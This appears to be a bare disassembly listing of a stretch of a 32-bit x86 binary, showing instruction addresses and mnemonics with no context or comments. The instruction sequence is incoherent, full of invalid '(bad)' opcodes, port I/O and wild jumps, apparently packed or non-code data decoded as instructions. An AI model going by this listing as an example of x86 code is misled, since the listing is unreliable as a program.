  40df02:	ins    DWORD PTR es:[edi],dx
  40df03:	rcl    DWORD PTR ds:0xd01e1528,0x13
  40df0a:	adc    eax,0x56140068
  40df0f:	das    
  40df10:	push   ss
  40df11:	add    BYTE PTR [eax-0x70],al
  40df14:	loopne 0x40df75
  40df16:	jle    0x40df31
  40df18:	or     al,0x83
  40df1a:	aam    0xed
  40df1c:	je     0x40df91
  40df1e:	ins    BYTE PTR es:[edi],dx
  40df1f:	mov    dl,0xf5
  40df21:	cwde   
  40df22:	fld    TBYTE PTR [eax-0x4b]
  40df25:	test   BYTE PTR [esi+ebp*2+0x339043ef],bl
  40df2c:	sub    dh,bh
  40df2e:	adc    cl,BYTE PTR [esi-0x3f]
  40df31:	out    0x6f,eax
  40df33:	inc    ebx
  40df34:	retf   
  40df35:	add    BYTE PTR [eax],0x0
  40df38:	add    BYTE PTR [eax],al
  40df3a:	add    bl,ch
  40df3c:	xchg   esi,eax
  40df3d:	fld    QWORD PTR [ebx]
  40df3f:	in     al,0x83
  40df41:	mov    esp,0xe2459424
  40df46:	mov    ss,esi
  40df48:	pop    esi
  40df49:	fadd   QWORD PTR [edi]
  40df4b:	sbb    esi,DWORD PTR [edi+0x55]
  40df4e:	in     al,dx
  40df4f:	aas    
  40df50:	iret   
  40df51:	in     eax,0xa3
  40df53:	ss inc esi
  40df55:	add    DWORD PTR [edi+ebp*1],esp
  40df58:	inc    esi
  40df59:	or     DWORD PTR [edi+eiz*1],esp
  40df5c:	inc    ebp
  40df5d:	jmp    0xbe742ee4
  40df62:	add    eax,0xe864bf9d
  40df67:	mov    bl,0xaa
  40df69:	in     eax,0x86
  40df6b:	jae    0x40df03
  40df6d:	stc    
  40df6e:	add    edx,DWORD PTR [ebx]
  40df70:	push   esi
  40df71:	leave  
  40df72:	and    edx,DWORD PTR [eax+0x1d1ff2cf]
  40df78:	jbe    0x40df43
  40df7a:	pop    ss
  40df7b:	out    0x45,eax
  40df7d:	shl    DWORD PTR [ebx],0xdf
  40df80:	inc    ebp
  40df81:	leave  
  40df82:	xor    edx,edi
  40df84:	inc    ebp
  40df85:	add    DWORD PTR [edx+edi*1],esi
  40df88:	mov    dl,0xdb
  40df8a:	add    esp,DWORD PTR [eax-0x31]
  40df8d:	ror    BYTE PTR [edi],cl
  40df8f:	arpl   WORD PTR [ecx+0x6c],sp
  40df92:	push   ebx
  40df93:	scas   eax,DWORD PTR es:[edi]
  40df94:	mov    BYTE PTR [edx-0x7d],cl
  40df97:	scas   al,BYTE PTR es:[edi]
  40df98:	cmp    dh,BYTE PTR [esi]
  40df9a:	ins    BYTE PTR es:[edi],dx
  40df9b:	sbb    ecx,DWORD PTR [edx+0xe]
  40df9e:	call   0x40dfa3
  40dfa3:	add    BYTE PTR [ebx-0x4e7136c5],dl
  40dfa9:	imul   eax,DWORD PTR [ebx+0x16f4710c],0xffffffe9
  40dfb0:	push   0x7916e339
  40dfb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfb6:	lods   eax,DWORD PTR ds:[esi]
  40dfb7:	cdq    
  40dfb8:	fs jb  0x40dfc9
  40dfbb:	push   es
  40dfbc:	imul   esp,DWORD PTR [edx-0x327c8b11],0x4712e579
  40dfc6:	push   es
  40dfc7:	out    dx,al
  40dfc8:	arpl   WORD PTR [edx-0x32edaa1a],ax
  40dfce:	out    dx,eax
  40dfcf:	cmp    al,0xce
  40dfd1:	mov    eax,ds:0xda0f3c0e
  40dfd6:	out    dx,eax
  40dfd7:	push   esp
  40dfd8:	xchg   esp,eax
  40dfd9:	adc    edi,DWORD PTR [edi+0x50]
  40dfdc:	pop    eax
  40dfdd:	into   
  40dfde:	lock xor al,0x88
  40dfe1:	int    0x79
  40dfe3:	fst    DWORD PTR [edx]
  40dfe5:	inc    edi
  40dfe6:	add    ch,BYTE PTR [esi+0x19efb618]
  40dfec:	int3   
  40dfed:	fiadd  DWORD PTR [ebp-0x61]
  40dff0:	adc    cl,ch
  40dff2:	push   ecx
  40dff3:	stos   DWORD PTR es:[edi],eax
  40dff4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dff5:	mov    dl,0x59
  40dff7:	bound  esp,QWORD PTR [edi-0x34]
  40dffa:	jns    0x40dfdd
  40dffc:	xor    al,0x5e
  40dffe:	gs and eax,0xdd79cd8c
  40e004:	adc    al,BYTE PTR [edi+0x1e]
  40e007:	outs   dx,BYTE PTR ds:[esi]
  40e008:	add    BYTE PTR [eax],al
  40e00a:	add    BYTE PTR [eax],al
  40e00c:	add    al,bl
  40e00e:	mov    ecx,0xcd9bdcef
  40e013:	jle    0x40e032
  40e015:	xor    al,0x8
  40e017:	icebp  
  40e018:	push   esi
  40e019:	adc    ch,BYTE PTR [edi-0x34]
  40e01c:	cmc    
  40e01d:	xchg   ebx,eax
  40e01e:	add    DWORD PTR [bx+si],0x45
  40e022:	xor    BYTE PTR [ebx+0x18],bh
  40e025:	sbb    dl,al
  40e027:	inc    sp
  40e029:	test   eax,0x66147b30
  40e02e:	retf   0xfeff
  40e031:	sub    al,0xbd
  40e033:	out    dx,eax
  40e034:	jne    0x40dfb7
  40e036:	xor    BYTE PTR [eax+0x40],ah
  40e039:	xchg   ecx,eax
  40e03a:	sub    edx,esi
  40e03c:	inc    DWORD PTR [esi+0x7914cdd2]
  40e042:	jmp    0x83f7:0x55faec84
  40e049:	xchg   ebp,eax
  40e04a:	test   DWORD PTR [ebx+0x56],ebx
  40e04d:	repnz mov bh,BYTE PTR [esi+0x69]
  40e051:	jge    0x40e009
  40e053:	push   edi
  40e054:	xor    edx,DWORD PTR [edx+0x5e]
  40e057:	pop    ecx
  40e058:	ja     0x40e082
  40e05a:	mov    cl,0x8a
  40e05c:	rcr    ah,0xaa
  40e05f:	out    dx,eax
  40e060:	jne    0x40e093
  40e062:	xor    bh,BYTE PTR [ebx+0x14]
  40e065:	out    0xc4,al
  40e067:	(bad)  
  40e068:	(bad)  
  40e069:	pop    esp
  40e06a:	mov    ds:0x596d56ef,al
  40e06f:	sub    DWORD PTR [ecx],eax
  40e071:	add    BYTE PTR [eax],al
  40e073:	add    BYTE PTR [eax],al
  40e075:	add    cl,bh
  40e077:	mov    al,0x83
  40e079:	jge    0x40e070
  40e07b:	ds inc esp
  40e07d:	and    al,0xf6
  40e07f:	add    ecx,DWORD PTR [edi]
  40e081:	mov    bh,BYTE PTR [edx]
  40e083:	ds fs and al,0xe4
  40e087:	cmp    BYTE PTR [esp-0x9],bl
  40e08b:	mov    eax,ds:0xfa70c2b8
  40e090:	sub    edx,DWORD PTR [edx+edx*8]
  40e093:	jne    0x40e110
  40e095:	je     0x40e098
  40e097:	les    edi,FWORD PTR [edx+ebp*2]
  40e09a:	mov    eax,ds:0x90244c3d
  40e09f:	(bad)  
  40e0a0:	fimul  DWORD PTR [edi-0x49]
  40e0a3:	vunpckhps xmm2,xmm2,XMMWORD PTR [eax-0x25]
  40e0a8:	mov    al,bl
  40e0aa:	xchg   esp,eax
  40e0ab:	pop    esi
  40e0ac:	(bad)  
  40e0ad:	and    ecx,DWORD PTR [edi+0x6c43812b]
  40e0b3:	(bad)  
  40e0b4:	fisttp DWORD PTR [esp+edx*8-0x20afc803]
  40e0bb:	or     al,BYTE PTR [ebx+0x721768cd]
  40e0c1:	(bad)  
  40e0c2:	ja     0x40e114
  40e0c4:	inc    edx
  40e0c5:	mov    esp,edi
  40e0c7:	std    
  40e0c8:	add    BYTE PTR [edx-0x7be20a44],cl
  40e0ce:	dec    ecx
  40e0cf:	dec    esi
  40e0d0:	out    0xe,al
  40e0d2:	push   ds
  40e0d3:	xchg   edi,eax
  40e0d4:	ret    0xd488
  40e0d7:	mov    ebp,0x8b1a
  40e0dc:	add    BYTE PTR [eax],al
  40e0de:	add    ah,cl
  40e0e0:	mov    ch,0x16
  40e0e2:	cmp    edx,esp
  40e0e4:	mov    ebp,0x598d751a
  40e0e9:	je     0x40e0ec
  40e0eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0ec:	test   eax,0xdc91f88a
  40e0f1:	xchg   DWORD PTR [esi+0x3b0bd990],esp
  40e0f7:	int3   
  40e0f8:	mov    ch,0x1a
  40e0fa:	jne    0x40e091
  40e0fc:	pop    ecx
  40e0fd:	je     0x40e101
  40e0ff:	jl     0x40e0e5
  40e101:	(bad)  
  40e102:	ror    DWORD PTR [eax],0x8e
  40e105:	es push cs
  40e107:	mov    edx,0xf985fa06
  40e10c:	inc    esi
  40e10d:	or     eax,DWORD PTR [eax]
  40e10f:	nop
  40e110:	pop    esi
  40e111:	(bad)  
  40e112:	and    ecx,DWORD PTR [edi+0x7c748da9]
  40e118:	pop    esp
  40e119:	clc    
  40e11a:	packuswb mm6,QWORD PTR [edx-0x252a734a]
  40e121:	stos   BYTE PTR es:[edi],al
  40e122:	jp     0x40e0e2
  40e124:	retf   
  40e125:	imul   ecx,DWORD PTR [ebx+0x7f],0x6e
  40e129:	or     DWORD PTR [ecx],edx
  40e12b:	and    al,0x2c
  40e12d:	jl     0x40e11e
  40e12f:	jae    0x40e0ee
  40e131:	das    
  40e132:	inc    esi
  40e133:	pop    ss
  40e134:	pop    edi
  40e135:	add    DWORD PTR [edi],ecx
  40e137:	stos   DWORD PTR es:[edi],eax
  40e138:	and    al,0xf5
  40e13a:	pop    esp
  40e13b:	rcl    bh,cl
  40e13d:	test   DWORD PTR [ebx-0x30654e77],eax
  40e143:	add    BYTE PTR [eax],al
  40e145:	add    BYTE PTR [eax],al
  40e147:	add    bh,al
  40e149:	outs   dx,BYTE PTR ds:[esi]
  40e14a:	rcl    DWORD PTR [eax],0xfc
  40e14d:	je     0x40e103
  40e14f:	aam    0xc6
  40e151:	pop    eax
  40e152:	out    0x8c,al
  40e154:	push   ebp
  40e155:	cmp    DWORD PTR [edx+0x59dab027],edx
  40e15b:	aas    
  40e15c:	xchg   edx,eax
  40e15d:	mov    dl,0x6a
  40e15f:	inc    ebx
  40e160:	ret    
  40e161:	mov    eax,ds:0xb1bf8c7c
  40e166:	in     eax,0x3
  40e168:	or     DWORD PTR [esi+0x1],edi
  40e16b:	adc    al,0xb
  40e16d:	cli    
  40e16e:	int    0x35
  40e170:	imul   esi,DWORD PTR [ecx-0x695c811b],0xffffffd5
  40e177:	mov    dl,bl
  40e179:	xchg   esi,eax
  40e17a:	icebp  
  40e17b:	ror    BYTE PTR [eax],cl
  40e17d:	jbe    0x40e188
  40e17f:	inc    eax
  40e180:	arpl   WORD PTR ds:0x62ac2822,di
  40e186:	cmp    BYTE PTR [edi+0x53],al
  40e189:	xchg   esi,eax
  40e18a:	leave  
  40e18b:	sub    edx,DWORD PTR [eax+0x457ee5b2]
  40e191:	mov    ds,WORD PTR [ecx+edx*1+0x7eed44e7]
  40e198:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40e19a:	push   cs
  40e19b:	jbe    0x40e176
  40e19d:	mov    edx,0x6ee66e57
  40e1a2:	add    DWORD PTR [ecx+0x34],0x2b
  40e1a6:	jns    0x40e190
  40e1a8:	xchg   ebx,eax
  40e1a9:	aaa    
  40e1aa:	int3   
  40e1ab:	mov    dh,0x0
  40e1ad:	add    BYTE PTR [eax],al
  40e1af:	add    BYTE PTR [eax],al
  40e1b1:	aad    0x67
  40e1b3:	add    DWORD PTR [ecx+esi*4-0x10],0x1a
  40e1b8:	jmp    0xd96b20e3
  40e1bd:	push   ds
  40e1be:	aas    
  40e1bf:	sub    bl,cl
  40e1c1:	push   ss
  40e1c2:	aas    
  40e1c3:	sub    bl,cl
  40e1c5:	push   cs
  40e1c6:	inc    esi
  40e1c7:	sub    bh,cl
  40e1c9:	pop    esp
  40e1ca:	rol    BYTE PTR [edi+ebx*1-0x6333701],cl
  40e1d1:	xchg   ebx,eax
  40e1d2:	arpl   WORD PTR [ebp-0x46],bx
  40e1d5:	dec    eax
  40e1d6:	popa   
  40e1d7:	fs call 0x6d0f1f19
  40e1dd:	inc    eax
  40e1de:	xchg   esi,eax
  40e1df:	push   ss
  40e1e0:	cwde   
  40e1e1:	imul   edx,DWORD PTR [ebx-0x369703c5],0x3b7c0d7a
  40e1eb:	dec    ebx
  40e1ec:	add    eax,0xa1836368
  40e1f1:	stos   DWORD PTR es:[edi],eax
  40e1f2:	push   es
  40e1f3:	add    al,0xe9
  40e1f5:	xchg   ebx,eax
  40e1f6:	cmp    eax,0x3d6c0d53
  40e1fb:	mul    DWORD PTR [esi+ebx*4+0x45]
  40e1ff:	sbb    eax,0x7a99554f
  40e204:	fisttp QWORD PTR [esi-0x5d8df5bc]
  40e20a:	cmp    eax,0xe6de91c0
  40e20f:	out    dx,eax
  40e210:	xchg   esi,eax
  40e211:	or     dh,BYTE PTR [esi+0x2a]
  40e214:	lds    eax,FWORD PTR [eax]
  40e216:	add    BYTE PTR [eax],al
  40e218:	add    BYTE PTR [eax],al
  40e21a:	enter  0x7ec8,0x0
  40e21e:	fnstsw WORD PTR [eax+eax*2]
  40e221:	or     BYTE PTR [edx],bl
  40e223:	ja     0x40e20c
  40e225:	fadd   st,st(4)
  40e227:	mov    ch,0xe
  40e229:	mov    edx,DWORD PTR [ecx]
  40e22b:	cmp    esp,ebx
  40e22d:	je     0x40e203
  40e22f:	push   es
  40e230:	lock pop ds
  40e232:	test   eax,0xed8958b5
  40e237:	xchg   ecx,eax
  40e238:	cs call 0x4fec4e
  40e23e:	and    al,BYTE PTR [ebp-0x76]
  40e241:	mul    ch
  40e243:	std    
  40e244:	add    BYTE PTR [ebp+eax*4-0x72],0x5e
  40e249:	mov    esi,DWORD PTR ds:0x44561a91
  40e24f:	jo     0x40e25a
  40e251:	push   eax
  40e252:	imul   esi,DWORD PTR [ebp-0x3ec600f2],0xca78f88c
  40e25c:	daa    
  40e25d:	mov    eax,DWORD PTR [edi]
  40e25f:	mov    ebp,0x8ee5d289
  40e264:	cmp    eax,eax
  40e266:	pop    es
  40e267:	xchg   BYTE PTR [esp+esi*2],cl
  40e26a:	arpl   bx,bx
  40e26c:	lock mov edi,esi
  40e26f:	push   ebp
  40e270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e271:	xchg   esi,eax
  40e272:	sub    DWORD PTR [ebp-0x462a3f77],esi
  40e278:	out    dx,eax
  40e279:	jae    0x40e2b0
  40e27b:	cmp    bl,BYTE PTR ds:0x8b
  40e281:	add    BYTE PTR [eax],al
  40e283:	pop    edi
  40e284:	mov    dh,0xe6
  40e286:	icebp  
  40e287:	std    
  40e288:	inc    esi
  40e289:	lock mov ebp,edi
  40e28c:	push   ebp
  40e28d:	mov    bh,BYTE PTR [eax+edi*8+0x21cd83b4]
  40e294:	enter  0x1b3,0xe9
  40e298:	out    0x84,al
  40e29a:	iret   
  40e29b:	nop
  40e29c:	xor    edi,ecx
  40e29e:	mov    ebx,0x5cd2db91
  40e2a3:	dec    ebx
  40e2a4:	xchg   edx,eax
  40e2a5:	rol    ecx,cl
  40e2a7:	sbb    bl,0xd8
  40e2aa:	mov    ah,ah
  40e2ac:	pop    ebx
  40e2ad:	not    WORD PTR [ebx]
  40e2b0:	inc    edi
  40e2b1:	es mov edx,ecx
  40e2b4:	inc    ecx
  40e2b5:	(bad)  
  40e2b6:	and    edx,DWORD PTR [esp+eax*2+0x17094bca]
  40e2bd:	sub    BYTE PTR [ebx+ebx*1],cl
  40e2c0:	push   cs
  40e2c1:	adc    al,0x53
  40e2c3:	sbb    eax,DWORD PTR [ebx]
  40e2c5:	enter  0x1355,0x7a
  40e2c9:	add    dl,BYTE PTR [edi+0xb]
  40e2cc:	dec    BYTE PTR [edi]
  40e2ce:	lea    eax,[eax]
  40e2d0:	into   
  40e2d1:	test   DWORD PTR [eax+eiz*4+0x42],eax
  40e2d5:	fisub  WORD PTR [ebx]
  40e2d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2d8:	push   esi
  40e2d9:	shr    DWORD PTR [edi+0xc],1
  40e2dc:	call   0x14:0x381316f6
  40e2e3:	fdivr  QWORD PTR [eax]
  40e2e5:	jae    0x40e35c
  40e2e7:	add    BYTE PTR [eax],al
  40e2e9:	add    BYTE PTR [eax],al
  40e2eb:	add    BYTE PTR [eax+0x44],bh
  40e2ee:	inc    ebp
  40e2ef:	(bad)  
  40e2f0:	fsubrp st(5),st
  40e2f2:	arpl   dx,dx
  40e2f4:	push   ss
  40e2f5:	fisttp DWORD PTR [ebx]
  40e2f7:	test   DWORD PTR [eax+0x66],edx
  40e2fa:	mov    edi,0xb5e59e7
  40e2ff:	add    BYTE PTR [ebx],cl
  40e301:	(bad)  
  40e302:	adc    cl,BYTE PTR [edx-0x48810db8]
  40e308:	xchg   ecx,eax
  40e309:	fxam   
  40e30b:	call   FWORD PTR [esi]
  40e30d:	jle    0x40e335
  40e30f:	sbb    BYTE PTR ds:0xf501298,al
  40e315:	retf   0x7572
  40e318:	pushf  
  40e319:	mov    dl,0x2f
  40e31b:	jge    0x40e2a1
  40e31d:	mov    dh,0x90
  40e31f:	div    DWORD PTR [ebx+0x5b89367e]
  40e325:	mov    ds,ecx
  40e327:	imul   eax,DWORD PTR [ebx-0x4f],0xffffffe5
  40e32b:	add    ecx,DWORD PTR [ecx]
  40e32d:	outs   dx,DWORD PTR ds:[esi]
  40e32e:	leave  
  40e32f:	pop    ds
  40e330:	or     al,0xec
  40e332:	icebp  
  40e333:	or     bh,BYTE PTR [eax-0x6ffd0571]
  40e339:	cmp    esp,DWORD PTR [edx+0x262d9c27]
  40e33f:	or     al,0xc
  40e341:	xor    al,0xe6
  40e343:	add    edx,DWORD PTR [eax-0x39718fe]
  40e349:	cmp    edi,DWORD PTR ds:0xe72f556b
  40e34f:	add    eax,DWORD PTR [eax]
  40e351:	add    BYTE PTR [eax],al
  40e353:	add    BYTE PTR [eax],al
  40e355:	stos   DWORD PTR es:[edi],eax
  40e356:	pop    eax
  40e357:	cmp    BYTE PTR [ebx+esi*1+0x1b03e5b2],dh
  40e35e:	jne    0x40e351
  40e360:	imul   edi,DWORD PTR [ebp-0x17fc18f4],0xffffffb2
  40e367:	cmc    
  40e368:	add    edx,DWORD PTR [eax-0x53d86dcb]
  40e36e:	cmp    esi,esi
  40e370:	inc    ebx
  40e371:	push   ss
  40e372:	ss out 0x3,al
  40e375:	nop
  40e376:	scas   al,BYTE PTR es:[edi]
  40e377:	in     eax,0x3
  40e379:	nop
  40e37a:	fcmovbe st,st(0)
  40e37c:	test   DWORD PTR [eax-0x3c8d9d4e],edx
  40e382:	cwde   
  40e383:	(bad)  
  40e384:	shl    BYTE PTR [ebx-0x49],0x35
  40e388:	(bad)  
  40e389:	push   eax
  40e38a:	bound  esi,QWORD PTR [edi+ecx*4]
  40e38d:	push   ebp
  40e38e:	ficom  DWORD PTR [edx+0x69c71f58]
  40e394:	inc    esp
  40e395:	mov    ds:0x8690eac,eax
  40e39a:	xchg   ebx,eax
  40e39b:	(bad)  
  40e39c:	call   0x74998798
  40e3a1:	rcl    BYTE PTR [edx+0x3e7b392a],1
  40e3a7:	add    bh,BYTE PTR [eax]
  40e3a9:	pop    ds
  40e3aa:	jnp    0x40e3d6
  40e3ac:	leave  
  40e3ad:	jnp    0x40e42e
  40e3af:	lock xchg BYTE PTR [ebx+0x3c],bl
  40e3b3:	inc    ebx
  40e3b4:	lds    esi,FWORD PTR [ebx+0x3266da]
  40e3ba:	add    BYTE PTR [eax],al
  40e3bc:	add    BYTE PTR [eax],al
  40e3be:	xchg   ebp,eax
  40e3bf:	mov    dl,0x83
  40e3c1:	sahf   
  40e3c2:	xor    al,0x3
  40e3c4:	(bad)  
  40e3c5:	jmp    0x40e35a
  40e3c7:	cs iret 
  40e3c9:	aam    0x9e
  40e3cb:	pop    esp
  40e3cc:	push   es
  40e3cd:	push   esi
  40e3ce:	and    DWORD PTR [esi],0x8493a91d
  40e3d4:	into   
  40e3d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3d6:	mov    ecx,0xb944836b
  40e3db:	lock push ss
  40e3dd:	jmp    0x3b249725
  40e3e2:	pminub mm0,QWORD PTR [edx]
  40e3e5:	mov    edx,0xe5645d61
  40e3ea:	pop    edx
  40e3eb:	pop    esp
  40e3ec:	push   cs
  40e3ed:	fs push eax
  40e3ef:	xchg   edx,eax
  40e3f0:	push   ds
  40e3f1:	mov    ecx,0xe52a7218
  40e3f6:	inc    ebx
  40e3f7:	dec    esi
  40e3f8:	sbb    ebp,ecx
  40e3fa:	xchg   ebx,eax
  40e3fb:	xchg   edx,eax
  40e3fc:	out    dx,eax
  40e3fd:	jge    0x40e3ae
  40e3ff:	add    BYTE PTR [ebx+0x2a4a14f8],0x9
  40e406:	mov    ebx,0xd71a565f
  40e40b:	jo     0x40e440
  40e40d:	stos   BYTE PTR es:[edi],al
  40e40e:	and    BYTE PTR [esi+0x35],dl
  40e411:	dec    ebp
  40e412:	jo     0x40e3ca
  40e414:	jns    0x40e416
  40e416:	ret    
  40e417:	jecxz  0x40e47e
  40e419:	add    BYTE PTR [eax+0x3b],bh
  40e41c:	dec    esp
  40e41d:	and    al,0xe5
  40e41f:	loope  0x40e47d
  40e421:	push   ebx
  40e422:	add    BYTE PTR [eax],al
  40e424:	add    BYTE PTR [eax],al
  40e426:	add    BYTE PTR [esi],dh
  40e428:	(bad)  
  40e429:	sub    edi,DWORD PTR [eax]
  40e42b:	mov    eax,0x4ae8c235
  40e430:	mov    dh,0xe
  40e432:	add    BYTE PTR [edx-0x43],dh
  40e435:	sub    edx,DWORD PTR [edx+esi*2]
  40e438:	pop    ecx
  40e439:	cmp    al,0xc0
  40e43b:	jns    0x40e41c
  40e43d:	mov    ch,ch
  40e43f:	out    0x5,al
  40e441:	clc    
  40e442:	lea    edi,[ebp-0x6e]
  40e445:	adc    dl,BYTE PTR [eax-0x6d]
  40e448:	stos   DWORD PTR es:[edi],eax
  40e449:	pop    ebx
  40e44a:	(bad)  
  40e44b:	frstor [ebp+0x7b425136]
  40e451:	out    0x80,eax
  40e453:	mov    al,0xb1
  40e455:	push   cs
  40e456:	mov    eax,DWORD PTR ds:0x598b1aa6
  40e45c:	jl     0x40e42c
  40e45e:	test   DWORD PTR [edi-0x48],ebx
  40e461:	dec    edx
  40e462:	enter  0xe328,0x58
  40e466:	push   ebp
  40e467:	sub    BYTE PTR [esp+eax*2],dh
  40e46a:	and    al,0x75
  40e46c:	pop    ecx
  40e46d:	ja     0x40e44a
  40e46f:	imul   esi,DWORD PTR [ecx+0x69f3cd83],0xaec3b4e7
  40e479:	push   cs
  40e47a:	mov    esp,DWORD PTR [edi+0x68baa259]
  40e480:	mov    cl,0x84
  40e482:	ret    
  40e483:	and    al,0x54
  40e485:	or     eax,0x51e87932
  40e48a:	pop    ebx
  40e48b:	add    BYTE PTR [eax],al
  40e48d:	add    BYTE PTR [eax],al
  40e48f:	add    BYTE PTR [edx+0x25c20372],ch
  40e495:	mov    cl,0x59
  40e497:	mov    edx,DWORD PTR [eax-0x6bbb7e11]
  40e49d:	mov    al,ds:0xc0a547cb
  40e4a2:	jbe    0x40e518
  40e4a4:	jo     0x40e4aa
  40e4a6:	loopne 0x40e4c3
  40e4a8:	jbe    0x14e4cfc0
  40e4ae:	loopne 0x40e4d7
  40e4b0:	jmp    DWORD PTR [ebp+0x7f513b2e]
  40e4b6:	fild   WORD PTR [edi+ebp*8]
  40e4b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4ba:	sub    ch,bl
  40e4bc:	xchg   ebx,eax
  40e4bd:	xor    al,0xe0
  40e4bf:	adc    ebx,edi
  40e4c1:	lds    ebx,FWORD PTR [ebx]
  40e4c3:	inc    eax
  40e4c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4c6:	dec    eax
  40e4c7:	and    edx,DWORD PTR [eax+0x5d1f6658]
  40e4cd:	push   eax
  40e4ce:	daa    
  40e4cf:	jo     0x40e4fa
  40e4d1:	pop    ss
  40e4d2:	or     al,0xe8
  40e4d4:	cdq    
  40e4d5:	call   0x9b54e4e6
  40e4da:	fild   QWORD PTR [edi+eiz*4]
  40e4dd:	fimul  WORD PTR [edi]
  40e4df:	dec    eax
  40e4e0:	lahf   
  40e4e1:	push   es
  40e4e2:	adc    BYTE PTR [eax-0x69],cl
  40e4e5:	dec    BYTE PTR [edi]
  40e4e7:	dec    eax
  40e4e8:	pop    DWORD PTR [esi]
  40e4ea:	adc    BYTE PTR [eax-0x79],cl
  40e4ed:	dec    BYTE PTR [edi]
  40e4ef:	dec    eax
  40e4f0:	jg     0x40e518
  40e4f2:	adc    BYTE PTR [eax+0x0],cl
  40e4f5:	add    BYTE PTR [eax],al
  40e4f7:	add    BYTE PTR [eax],al
  40e4f9:	ja     0x40e519
  40e4fb:	adc    BYTE PTR [eax+0x6f],cl
  40e4fe:	adc    BYTE PTR es:[eax-0x3f],cl
  40e502:	push   eax
  40e503:	inc    edi
  40e504:	out    0x3,eax
  40e506:	lods   eax,DWORD PTR ds:[esi]
  40e507:	jne    0x40e507
  40e509:	imul   ecx,DWORD PTR [ebx+0x2890000a],0xbb8356de
  40e513:	fst    QWORD PTR [ebp+0x3f]
  40e516:	mov    bl,0x51
  40e518:	and    ah,cl
  40e51a:	aaa    
  40e51b:	mov    ds:0xe9da90ed,eax
  40e520:	cmp    dl,BYTE PTR [edx+0x147b6cb2]
  40e526:	les    esi,FWORD PTR [ecx]
  40e528:	in     eax,0x4
  40e52a:	and    al,0x66
  40e52c:	add    dl,BYTE PTR [eax+0x6486cb2]
  40e532:	add    BYTE PTR [edx-0x624d6ffd],cl
  40e538:	clc    
  40e539:	aas    
  40e53a:	mov    dl,0xe5
  40e53c:	mov    dl,BYTE PTR [ebx-0x72]
  40e53f:	cmc    
  40e540:	jle    0x40e569
  40e542:	ror    BYTE PTR ds:[esi+ecx*8-0x6ecf8826],cl
  40e54a:	mov    dl,0x7c
  40e54c:	mov    edi,0x796ca273
  40e551:	or     al,0xc4
  40e553:	stc    
  40e554:	xor    BYTE PTR [ebx],dl
  40e556:	or     BYTE PTR [edx+0x3],bh
  40e559:	nop
  40e55a:	mov    dl,0xe6
  40e55c:	in     eax,dx
  40e55d:	add    BYTE PTR [eax],al
  40e55f:	add    BYTE PTR [eax],al
  40e561:	add    BYTE PTR [ecx+0x57ead268],dl
  40e567:	ret    
  40e568:	fstp   DWORD PTR [edi]
  40e56a:	push   eax
  40e56b:	cmp    DWORD PTR [ebp-0x79],edx
  40e56e:	xchg   edi,eax
  40e56f:	ret    
  40e570:	in     eax,0xd2
  40e572:	sbb    dh,ch
  40e574:	dec    ebp
  40e575:	add    DWORD PTR [ebp+0x3f7f20c3],0x3d
  40e57c:	mov    eax,0xe60e4278
  40e581:	add    edx,DWORD PTR [eax-0x1194d6c9]
  40e587:	or     ah,bh
  40e589:	add    ecx,DWORD PTR [ebx]
  40e58b:	repz sbb eax,0xe5b19ec6
  40e591:	js     0x40e556
  40e593:	mov    cs,WORD PTR [esi]
  40e595:	popf   
  40e596:	enter  0x2a3f,0x95
  40e59a:	mov    eax,0xbf3d2a3f
  40e59f:	aas    
  40e5a0:	sub    dh,BYTE PTR ds:0x3d2a3fa7
  40e5a6:	lahf   
  40e5a7:	aas    
  40e5a8:	sub    dh,BYTE PTR ds:0x1d2a3fa7
  40e5ae:	lahf   
  40e5af:	aas    
  40e5b0:	sub    dl,BYTE PTR ds:0xc1c237e5
  40e5b6:	jne    0x40e57d
  40e5b8:	out    dx,eax
  40e5b9:	scas   al,BYTE PTR es:[edi]
  40e5ba:	or     edx,ebx
  40e5bc:	out    0xab,al
  40e5be:	add    dh,BYTE PTR [edx-0x12e4c1f2]
  40e5c4:	push   eax
  40e5c5:	xor    al,BYTE PTR [eax]
  40e5c7:	add    BYTE PTR [eax],al
  40e5c9:	add    BYTE PTR [eax],al
  40e5cb:	leave  
  40e5cc:	das    
  40e5cd:	retf   
  40e5ce:	leave  
  40e5cf:	push   ecx
  40e5d0:	(bad)  
  40e5d1:	push   cs
  40e5d2:	adc    edx,DWORD PTR [edx+0x702d8368]
  40e5d8:	mov    ds:0xc36b7fe6,al
  40e5dd:	out    dx,eax
  40e5de:	fs push esp
  40e5e0:	aas    
  40e5e1:	pop    esi
  40e5e2:	and    BYTE PTR [ebp-0x2f9b00a2],bh
  40e5e8:	mov    cl,0xe
  40e5ea:	jmp    0xf56b5507
  40e5ef:	ret    
  40e5f0:	xor    eax,0x62780d4b
  40e5f5:	fs or  al,0x7
  40e5f8:	inc    esi
  40e5f9:	sub    ah,BYTE PTR [ecx+0x12a4614]
  40e5ff:	mov    edi,0x77cd2a75
  40e604:	ret    0xe9ef
  40e607:	out    0x66,al
  40e609:	outs   dx,BYTE PTR ds:[esi]
  40e60a:	bound  esp,QWORD PTR [eax-0x6a]
  40e60d:	push   ds
  40e60e:	push   0xffffffdc
  40e610:	mov    dl,0x79
  40e612:	add    BYTE PTR ds:0x65247b49,dh
  40e618:	sub    ecx,DWORD PTR [esp+0x5d]
  40e61c:	out    0x84,al
  40e61e:	inc    esi
  40e61f:	and    eax,0xd9ff22cc
  40e624:	scas   al,BYTE PTR es:[edi]
  40e625:	out    dx,eax
  40e626:	push   ebp
  40e627:	shr    DWORD PTR ds:0xf5b2544a,0x7
  40e62e:	jmp    0x40e633
  40e633:	add    BYTE PTR [eax],ch
  40e635:	mov    bh,0xe
  40e637:	add    BYTE PTR [eax+0x770f47c7],dl
  40e63d:	push   ecx
  40e63e:	out    dx,eax
  40e63f:	(bad)  
  40e640:	stc    
  40e641:	jle    0x40e5de
  40e643:	mov    ecx,gs
  40e645:	mov    ch,0xe
  40e647:	mov    edi,DWORD PTR [ebp+0x6a894a92]
  40e64d:	sub    eax,0x2cf9fff0
